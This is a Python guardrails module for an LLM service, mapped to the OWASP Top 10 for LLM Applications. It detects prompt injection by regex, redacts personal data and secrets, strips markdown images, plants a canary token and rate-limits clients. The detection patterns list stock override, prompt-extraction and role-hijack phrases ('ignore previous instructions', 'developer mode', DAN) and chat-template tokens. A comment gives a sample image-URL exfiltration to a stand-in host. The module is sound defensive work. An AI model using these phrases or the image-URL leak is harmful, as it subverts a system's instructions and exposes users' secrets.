"""Guardrails around the model, mapped to the OWASP Top 10 for LLM
Applications (2025).

Layered, deterministic, dependency-free controls. None of them "solves"
prompt injection — no filter can, because instructions and data share one
channel. They raise the cost of an attack, contain what a successful one can
leak, and leave an audit trail. The structural controls matter more:
server-owned system prompt (schemas.py), no tools or credentials given to
the model (no excessive agency), output treated as untrusted.

    LLM01 Prompt Injection           detect_injection()        -> 400
    LLM02 Sensitive Info Disclosure  redact() on input + output
    LLM05 Improper Output Handling   strip_exfil_markdown(), output as data
    LLM07 System Prompt Leakage      canary token in the system prompt
    LLM10 Unbounded Consumption      RateLimiter + size caps (schemas.py)
"""

import re
import secrets
import threading
import time
from collections import defaultdict, deque

# --- LLM01: prompt injection (heuristics) -----------------------------------
# Known override phrasings and chat-template control tokens. A match blocks
# the request; the pattern NAME is logged, never the user's text.
_INJECTION_PATTERNS: dict[str, re.Pattern] = {
    "override_instructions": re.compile(
        r"\b(ignore|disregard|forget|override)\b.{0,40}\b(previous|prior|above|earlier|all|system)\b"
        r".{0,20}\b(instructions?|prompts?|rules?|directives?)\b",
        re.I | re.S,
    ),
    "reveal_system_prompt": re.compile(
        r"\b(reveal|show|print|repeat|output|display|leak)\b.{0,40}"
        r"\b(system prompt|instructions|initial prompt|hidden prompt)\b",
        re.I | re.S,
    ),
    "role_hijack": re.compile(
        r"\byou are (now|no longer)\b|\bact as\b.{0,30}\b(unrestricted|jailbroken|dan)\b"
        r"|\bdeveloper mode\b",
        re.I,
    ),
    "template_tokens": re.compile(
        r"<\|(im_start|im_end|system|endoftext)\|>|\[/?INST\]|<</?SYS>>|^\s*#{2,}\s*system\b",
        re.I | re.M,
    ),
}


def detect_injection(text: str) -> str | None:
    """Name of the first matching injection pattern, or None."""
    for name, pattern in _INJECTION_PATTERNS.items():
        if pattern.search(text):
            return name
    return None


# --- LLM02: sensitive information (redaction) -------------------------------
# Applied to what the caller sends (the model provider never receives it)
# and to what the model returns (it cannot echo or invent it back).
_PII_PATTERNS: dict[str, re.Pattern] = {
    "EMAIL": re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b"),
    "IBAN": re.compile(r"\b[A-Z]{2}\d{2}(?: ?[A-Z0-9]{4}){3,7}(?: ?[A-Z0-9]{1,3})?\b"),
    "AWS_KEY": re.compile(r"\b(AKIA|ASIA)[A-Z0-9]{16}\b"),
    "SECRET": re.compile(r"\b(sk-[A-Za-z0-9_-]{20,}|gh[pousr]_[A-Za-z0-9]{36,}|xox[abp]-[A-Za-z0-9-]{10,})\b"),
    "JWT": re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b"),
    # International (+33 6 12 34 56 78) or national 0X XX XX XX XX — narrow on
    # purpose: a loose phone regex also eats dates, versions and amounts.
    "PHONE": re.compile(r"(?<![\w+])(?:\+\d{1,3}(?:[ .-]?\d{1,4}){3,5}|0\d(?:[ .-]?\d{2}){4})(?!\w)"),
}
_CARD = re.compile(r"\b(?:\d[ -]?){13,19}\b")


def _luhn_ok(digits: str) -> bool:
    total, parity = 0, len(digits) % 2
    for i, ch in enumerate(digits):
        d = int(ch)
        if i % 2 == parity:
            d = d * 2 - 9 if d > 4 else d * 2
        total += d
    return total % 10 == 0


def redact(text: str) -> tuple[str, dict[str, int]]:
    """Replace sensitive values with [REDACTED:<TYPE>]; return counts per type."""
    counts: dict[str, int] = {}

    def card(m: re.Match) -> str:
        digits = re.sub(r"\D", "", m.group())
        if 13 <= len(digits) <= 19 and _luhn_ok(digits):
            counts["CARD"] = counts.get("CARD", 0) + 1
            return "[REDACTED:CARD]"
        return m.group()

    # Cards first (Luhn-checked) so the phone pattern does not eat them.
    text = _CARD.sub(card, text)
    for name, pattern in _PII_PATTERNS.items():
        text, n = pattern.subn(f"[REDACTED:{name}]", text)
        if n:
            counts[name] = counts.get(name, 0) + n
    return text, counts


# --- LLM05: improper output handling ----------------------------------------
# A markdown image is fetched by the client's renderer without a click: an
# injected model can exfiltrate data in the URL (![x](https://evil/?q=SECRET)).
# Remote images and links to raw IPs are removed; the reply stays text.
_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_HTML_TAG = re.compile(r"<\s*(script|iframe|img|object|embed|style)\b[^>]*>.*?(</\s*\1\s*>)?", re.I | re.S)


def strip_exfil_markdown(text: str) -> tuple[str, int]:
    text, n_img = _MD_IMAGE.subn("[image removed]", text)
    text, n_html = _HTML_TAG.subn("[markup removed]", text)
    return text, n_img + n_html


# --- LLM07: system prompt leakage -------------------------------------------
def new_canary() -> str:
    """Random marker appended to the system prompt. It has no meaning to the
    model; if it ever appears in a reply, the system prompt is leaking."""
    return f"canary-{secrets.token_hex(8)}"


# --- LLM10: unbounded consumption -------------------------------------------
class RateLimiter:
    """Sliding-window limit per client, in process memory.

    Per pod: with N replicas a client gets up to N x the limit. Enough as a
    second layer behind the WAF rate-limit rule; a shared limit needs a
    shared store (Redis) or an API gateway (APIM) in front.
    """

    def __init__(self, limit: int, window_seconds: float = 60.0):
        self.limit = limit
        self.window = window_seconds
        self._hits: dict[str, deque] = defaultdict(deque)
        self._lock = threading.Lock()

    def check(self, client: str) -> float:
        """0 if allowed (and counted), else seconds until a slot frees up."""
        now = time.monotonic()
        with self._lock:
            hits = self._hits[client]
            while hits and now - hits[0] >= self.window:
                hits.popleft()
            if len(hits) >= self.limit:
                return self.window - (now - hits[0])
            hits.append(now)
            return 0.0
